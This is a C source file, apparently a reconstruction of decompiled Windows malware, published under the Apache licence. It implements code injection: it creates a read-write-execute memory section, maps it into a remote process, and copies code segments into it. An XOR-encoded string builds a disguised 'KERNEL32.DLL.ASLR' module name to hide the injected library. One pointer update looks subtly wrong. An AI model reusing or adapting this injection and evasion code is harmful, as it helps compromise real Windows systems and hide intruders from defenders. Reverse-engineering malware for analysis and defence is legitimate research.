/******************************************************************************************
  Copyright (C) 2012-2014 Christian Roggia <christian.roggia@gmail.com>

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
******************************************************************************************/

#include "5. Utils.h"
#include "9. AssemblyBlock2.h"
#include "A. EncodingAlgorithms.h"
#include "C. CodeBlock.h"

#include "config.h"
#include "define.h"

// 100% (C) CODE MATCH
INT32 SharedMapViewOfSection(HANDLE hRemote, SIZE_T nSize, PHANDLE ppSection, PVOID *ppLocal, PVOID *ppRemote)
{
	SIZE_T iViewSize;			// Size of the map view
	NTSTATUS nRet;				// Value returned by the functions
	LARGE_INTEGER liMaxSize;	// Maximum size that can be allocated

	// Copy the values
	iViewSize = nSize;
	
	liMaxSize.LowPart  = nSize;
	liMaxSize.HighPart = 0;
	
	// Create a section and grant all access (read, write, execute)
	nRet = _F(ZwCreateSection)(ppSection, SECTION_ALL_ACCESS, NULL, &liMaxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, 0);
	HAS_FAILED(nRet, -5)
	
	// Create the 1st Map View for the local process
	nRet = _F(ZwMapViewOfSection)(*ppSection, GetCurrentProcess(), ppLocal , NULL, 0, NULL, &iViewSize, ViewShare, 0, PAGE_EXECUTE_READWRITE);
	HAS_FAILED(nRet, -5)
	
	// Create the 2nd Map View for the remote process
	nRet = _F(ZwMapViewOfSection)(*ppSection, hRemote            , ppRemote, NULL, 0, NULL, &iViewSize, ViewShare, 0, PAGE_EXECUTE_READWRITE);
	HAS_FAILED(nRet, -5)
	
	return 0;
}

// 99% (C) CODE MATCH
void CopySegmentIntoSections(PVOID *ppLocal, PVOID lpRemote, INT32 *nGlobalPtr, PSECTION_SEGEMENT_INFO lpRemoteInfo, PVOID lpBytes, DWORD dwSize)
{
	// If bytes has been provided copy them in the shared section
	if(dwSize)
		__memcpy(*ppLocal, lpBytes, dwSize);
	
	// Update the information for the remote view
	lpRemoteInfo->SegmentAddress = (DWORD)lpRemote + *nGlobalPtr;
	lpRemoteInfo->SegmentSize = dwSize;
	
	// Update the local information
	*ppLocal  = ppLocal + dwSize;
	*nGlobalPtr += dwSize;
}

const WORD ENCODED_KERNEL32_DLL_ASLR__08x[23] =
{
	0xAE59, 0xAE57, 0xAE40, 0xAE5C,
	0xAE57, 0xAE5E, 0xAE21, 0xAE20,
	0xAE3C, 0xAE56, 0xAE5E, 0xAE5E,
	0xAE3C, 0xAE53, 0xAE41, 0xAE5E,
	0xAE40, 0xAE3C, 0xAE37, 0xAE22,
	0xAE2A, 0xAE6A, 0xAE12
};

// 100% (C) CODE MATCH
INT32 GetRandomModuleName(GENERAL_INFO_BLOCK *lpInfoBlock, LPCWSTR lpszLibraryName)
{
	WCHAR __KERNEL32_DLL_ASLR_08x[42];
	DWORD dwRandom;

	// If a library name has been passed use it
	if(lpszLibraryName)
	{
		if(lstrlenW(lpszLibraryName) >= 31)
			return -1;
		
		lstrcpyW(lpInfoBlock->RandomLibraryName, lpszLibraryName);
	}
	else
	{
		dwRandom = GetTickCount() + 3 * GetCurrentThreadId();
		DecodeModuleNameW(ENCODED_KERNEL32_DLL_ASLR__08x, __KERNEL32_DLL_ASLR_08x);
		
		do
			wsprintfW(lpInfoBlock->RandomLibraryName, __KERNEL32_DLL_ASLR_08x, dwRandom++);
		while(GetModuleHandleW(lpInfoBlock->RandomLibraryName));
	}
	
	lpInfoBlock->OriginalAddress = (DWORD)lpInfoBlock ^ X_PTR_KEY;
	lpInfoBlock->UnknownZero0 = 0;
	lpInfoBlock->AlignAddressesFunction = (DWORD)BLOCK4_AlignAddresses;
	
	return 0;
}